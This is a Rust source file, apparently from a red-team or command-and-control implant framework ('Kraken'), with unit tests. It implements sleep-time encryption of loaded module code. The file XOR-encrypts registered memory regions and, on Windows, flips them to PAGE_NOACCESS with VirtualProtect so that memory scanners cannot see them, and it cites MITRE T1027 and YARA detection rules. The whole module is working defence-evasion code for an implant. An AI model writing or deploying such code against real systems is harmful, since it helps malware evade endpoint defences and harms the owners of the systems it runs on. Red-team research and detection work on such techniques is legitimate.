//! Module memory encryption — Phase 9 OPSEC
//!
//! ModuleEncryptor tracks loaded module code sections and encrypts them
//! during sleep. This protects module code from memory scanners during
//! idle periods, complementing sleep masking and heap encryption.
//!
//! Detection rules: wiki/detection/yara/kraken_opsec.yar
//!
//! ## MITRE ATT&CK
//! - T1027: Obfuscated Files or Information
//!
//! ## OPSEC
//! - Complements sleep masking (sleep_mask.rs) and heap encryption (heap_encrypt.rs)
//! - Encrypted modules are invisible to memory scanners during sleep
//! - On Windows: uses VirtualProtect to toggle page permissions
//! - On other platforms: XOR-only (no VirtualProtect)

use std::sync::Mutex;

/// A tracked module code region
#[derive(Debug)]
struct ModuleRegion {
    base: *mut u8,
    size: usize,
    encrypted: bool,
    /// Original memory protection flags (restored after decryption, Windows only)
    #[cfg_attr(not(windows), allow(dead_code))]
    original_protect: u32,
}

// SAFETY: ModuleRegion contains raw pointers but is only accessed
// through ModuleEncryptor which uses proper synchronization
unsafe impl Send for ModuleRegion {}

/// ModuleEncryptor manages encryption of loaded module code sections
///
/// Register module regions after loading with `register()`, then call
/// `encrypt_all()` before sleeping and `decrypt_all()` before dispatching
/// tasks to modules.
pub struct ModuleEncryptor {
    regions: Mutex<Vec<ModuleRegion>>,
    key: [u8; 32],
}

impl ModuleEncryptor {
    /// Create a new ModuleEncryptor with a random encryption key
    pub fn new() -> Self {
        Self {
            regions: Mutex::new(Vec::new()),
            key: generate_random_key(),
        }
    }

    /// Create a ModuleEncryptor with a specific key (for testing)
    pub fn with_key(key: [u8; 32]) -> Self {
        Self {
            regions: Mutex::new(Vec::new()),
            key,
        }
    }

    /// Register a module code region for encryption during sleep
    ///
    /// # Safety
    /// - `base` must be a valid pointer to `size` bytes of allocated memory
    /// - The memory must remain valid until `unregister()` is called
    /// - Caller must not access the memory while it's encrypted
    pub unsafe fn register(&self, base: *mut u8, size: usize) {
        if base.is_null() || size == 0 {
            return;
        }

        let mut regions = self.regions.lock().unwrap();

        // Check for duplicate registration
        if regions.iter().any(|r| r.base == base) {
            return;
        }

        regions.push(ModuleRegion {
            base,
            size,
            encrypted: false,
            original_protect: 0,
        });
    }

    /// Unregister a module region
    ///
    /// Call this before unloading a module that was registered.
    pub fn unregister(&self, base: *mut u8) {
        let mut regions = self.regions.lock().unwrap();
        regions.retain(|r| r.base != base);
    }

    /// Encrypt all registered module regions
    ///
    /// Call this before sleeping. On Windows, changes page protection to
    /// PAGE_READWRITE, XOR-encrypts, then sets to PAGE_NOACCESS to hide
    /// from scanners. On other platforms, XOR-encrypts only.
    ///
    /// # Safety
    /// - All registered pointers must still be valid
    /// - Caller must not access encrypted memory until `decrypt_all()` is called
    pub unsafe fn encrypt_all(&self) {
        let mut regions = self.regions.lock().unwrap();

        for region in regions.iter_mut() {
            if !region.encrypted {
                #[cfg(target_os = "windows")]
                {
                    let mut old_protect: u32 = 0;
                    windows_sys::Win32::System::Memory::VirtualProtect(
                        region.base as *const _,
                        region.size,
                        windows_sys::Win32::System::Memory::PAGE_READWRITE,
                        &mut old_protect,
                    );
                    region.original_protect = old_protect;
                }

                xor_memory(region.base, region.size, &self.key);

                #[cfg(target_os = "windows")]
                {
                    let mut _old: u32 = 0;
                    windows_sys::Win32::System::Memory::VirtualProtect(
                        region.base as *const _,
                        region.size,
                        windows_sys::Win32::System::Memory::PAGE_NOACCESS,
                        &mut _old,
                    );
                }

                region.encrypted = true;
            }
        }
    }

    /// Decrypt all registered module regions
    ///
    /// Call this after waking from sleep, before dispatching tasks to modules.
    /// On Windows, restores original page protection (typically PAGE_EXECUTE_READ).
    ///
    /// # Safety
    /// - All registered pointers must still be valid
    pub unsafe fn decrypt_all(&self) {
        let mut regions = self.regions.lock().unwrap();

        for region in regions.iter_mut() {
            if region.encrypted {
                #[cfg(target_os = "windows")]
                {
                    let mut _old: u32 = 0;
                    windows_sys::Win32::System::Memory::VirtualProtect(
                        region.base as *const _,
                        region.size,
                        windows_sys::Win32::System::Memory::PAGE_READWRITE,
                        &mut _old,
                    );
                }

                xor_memory(region.base, region.size, &self.key);

                #[cfg(target_os = "windows")]
                {
                    let mut _old: u32 = 0;
                    windows_sys::Win32::System::Memory::VirtualProtect(
                        region.base as *const _,
                        region.size,
                        region.original_protect,
                        &mut _old,
                    );
                }

                region.encrypted = false;
            }
        }
    }

    /// Get the number of registered regions
    pub fn region_count(&self) -> usize {
        self.regions.lock().unwrap().len()
    }

    /// Check if any regions are currently encrypted
    pub fn is_encrypted(&self) -> bool {
        self.regions
            .lock()
            .unwrap()
            .iter()
            .any(|r| r.encrypted)
    }

    /// Clear all registrations (without decrypting)
    ///
    /// Use with caution — only call when you know the memory is no longer valid.
    pub fn clear(&self) {
        self.regions.lock().unwrap().clear();
    }
}

impl Default for ModuleEncryptor {
    fn default() -> Self {
        Self::new()
    }
}

/// XOR memory region with key
///
/// # Safety
/// - `base` must be a valid pointer to at least `size` bytes
unsafe fn xor_memory(base: *mut u8, size: usize, key: &[u8; 32]) {
    for i in 0..size {
        let byte = base.add(i);
        *byte ^= key[i % 32];
    }
}

/// Generate a random 32-byte key
fn generate_random_key() -> [u8; 32] {
    let mut key = [0u8; 32];

    #[cfg(target_os = "windows")]
    {
        // Use stack address as entropy source (ASLR provides randomness)
        let stack_addr = &key as *const _ as u64;
        let mut state = stack_addr;
        for byte in key.iter_mut() {
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            *byte = (state >> 33) as u8;
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        use rand::RngCore;
        rand::thread_rng().fill_bytes(&mut key);
    }

    key
}

// Global ModuleEncryptor instance for convenience
lazy_static::lazy_static! {
    /// Global ModuleEncryptor instance
    ///
    /// Use this for simple cases. For more control, create your own ModuleEncryptor.
    pub static ref MODULE_ENCRYPTOR: ModuleEncryptor = ModuleEncryptor::new();
}

/// Register a module region with the global ModuleEncryptor
///
/// # Safety
/// See `ModuleEncryptor::register`
pub unsafe fn register_module(base: *mut u8, size: usize) {
    MODULE_ENCRYPTOR.register(base, size);
}

/// Unregister a module region from the global ModuleEncryptor
pub fn unregister_module(base: *mut u8) {
    MODULE_ENCRYPTOR.unregister(base);
}

/// Encrypt all module regions in the global ModuleEncryptor
///
/// # Safety
/// See `ModuleEncryptor::encrypt_all`
pub unsafe fn encrypt_modules() {
    MODULE_ENCRYPTOR.encrypt_all();
}

/// Decrypt all module regions in the global ModuleEncryptor
///
/// # Safety
/// See `ModuleEncryptor::decrypt_all`
pub unsafe fn decrypt_modules() {
    MODULE_ENCRYPTOR.decrypt_all();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_encryptor_new() {
        let enc = ModuleEncryptor::new();
        assert_eq!(enc.region_count(), 0);
        assert!(!enc.is_encrypted());
    }

    #[test]
    fn test_default_trait() {
        let enc = ModuleEncryptor::default();
        assert_eq!(enc.region_count(), 0);
        assert!(!enc.is_encrypted());
    }

    #[test]
    fn test_register_unregister() {
        let enc = ModuleEncryptor::new();
        let mut data = vec![1u8, 2, 3, 4, 5];

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());
        }
        assert_eq!(enc.region_count(), 1);

        enc.unregister(data.as_mut_ptr());
        assert_eq!(enc.region_count(), 0);
    }

    #[test]
    fn test_register_null_ignored() {
        let enc = ModuleEncryptor::new();

        unsafe {
            enc.register(std::ptr::null_mut(), 10);
        }
        assert_eq!(enc.region_count(), 0);
    }

    #[test]
    fn test_register_zero_size_ignored() {
        let enc = ModuleEncryptor::new();
        let mut data = vec![1u8];

        unsafe {
            enc.register(data.as_mut_ptr(), 0);
        }
        assert_eq!(enc.region_count(), 0);
    }

    #[test]
    fn test_duplicate_registration_ignored() {
        let enc = ModuleEncryptor::new();
        let mut data = vec![1u8, 2, 3, 4, 5];

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());
            enc.register(data.as_mut_ptr(), data.len());
        }
        assert_eq!(enc.region_count(), 1);
    }

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let key = [0x42u8; 32];
        let enc = ModuleEncryptor::with_key(key);

        let original = vec![0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        let mut data = original.clone();

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());

            // Encrypt
            enc.encrypt_all();
            assert!(enc.is_encrypted());
            assert_ne!(data, original, "Data should be encrypted");

            // Decrypt
            enc.decrypt_all();
            assert!(!enc.is_encrypted());
            assert_eq!(data, original, "Data should match original after decrypt");
        }
    }

    #[test]
    fn test_double_encrypt_idempotent() {
        let key = [0x42u8; 32];
        let enc = ModuleEncryptor::with_key(key);

        let original = vec![1u8, 2, 3, 4, 5];
        let mut data = original.clone();

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());

            enc.encrypt_all();
            let encrypted = data.clone();

            // Second encrypt should be no-op
            enc.encrypt_all();
            assert_eq!(data, encrypted, "Double encrypt should be idempotent");
        }
    }

    #[test]
    fn test_double_decrypt_idempotent() {
        let key = [0x42u8; 32];
        let enc = ModuleEncryptor::with_key(key);

        let original = vec![1u8, 2, 3, 4, 5];
        let mut data = original.clone();

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());

            enc.encrypt_all();
            enc.decrypt_all();

            // Second decrypt should be no-op
            enc.decrypt_all();
            assert_eq!(data, original, "Double decrypt should preserve data");
        }
    }

    #[test]
    fn test_multiple_regions() {
        let key = [0xABu8; 32];
        let enc = ModuleEncryptor::with_key(key);

        let original1 = vec![1u8, 2, 3];
        let original2 = vec![4u8, 5, 6, 7, 8];
        let original3 = vec![9u8, 10];

        let mut data1 = original1.clone();
        let mut data2 = original2.clone();
        let mut data3 = original3.clone();

        unsafe {
            enc.register(data1.as_mut_ptr(), data1.len());
            enc.register(data2.as_mut_ptr(), data2.len());
            enc.register(data3.as_mut_ptr(), data3.len());

            assert_eq!(enc.region_count(), 3);

            // Encrypt all
            enc.encrypt_all();
            assert_ne!(data1, original1);
            assert_ne!(data2, original2);
            assert_ne!(data3, original3);

            // Decrypt all
            enc.decrypt_all();
            assert_eq!(data1, original1);
            assert_eq!(data2, original2);
            assert_eq!(data3, original3);
        }
    }

    #[test]
    fn test_region_count_tracking() {
        let enc = ModuleEncryptor::new();
        let mut data1 = vec![1u8, 2, 3];
        let mut data2 = vec![4u8, 5, 6];

        assert_eq!(enc.region_count(), 0);

        unsafe {
            enc.register(data1.as_mut_ptr(), data1.len());
            assert_eq!(enc.region_count(), 1);

            enc.register(data2.as_mut_ptr(), data2.len());
            assert_eq!(enc.region_count(), 2);
        }

        enc.unregister(data1.as_mut_ptr());
        assert_eq!(enc.region_count(), 1);

        enc.unregister(data2.as_mut_ptr());
        assert_eq!(enc.region_count(), 0);
    }

    #[test]
    fn test_clear() {
        let enc = ModuleEncryptor::new();
        let mut data = vec![1u8, 2, 3];

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());
        }
        assert_eq!(enc.region_count(), 1);

        enc.clear();
        assert_eq!(enc.region_count(), 0);
    }

    #[test]
    fn test_xor_memory_roundtrip() {
        let key = [0x55u8; 32];
        let original = vec![0xAAu8, 0xBB, 0xCC, 0xDD];
        let mut data = original.clone();

        unsafe {
            xor_memory(data.as_mut_ptr(), data.len(), &key);
            assert_ne!(data, original);

            xor_memory(data.as_mut_ptr(), data.len(), &key);
            assert_eq!(data, original);
        }
    }

    #[test]
    fn test_generate_random_key_non_zero() {
        let key = generate_random_key();
        // Key should have some non-zero bytes
        assert!(key.iter().any(|&b| b != 0), "Key should not be all zeros");
    }

    #[test]
    fn test_thread_safety() {
        use std::sync::Arc;

        let enc = Arc::new(ModuleEncryptor::new());
        let mut data = vec![0u8; 64];

        unsafe {
            enc.register(data.as_mut_ptr(), data.len());
        }

        // Concurrent region_count and is_encrypted reads should not deadlock
        let enc2 = Arc::clone(&enc);
        let handle = std::thread::spawn(move || {
            let _ = enc2.region_count();
            let _ = enc2.is_encrypted();
        });

        let _ = enc.region_count();
        handle.join().unwrap();
    }
}
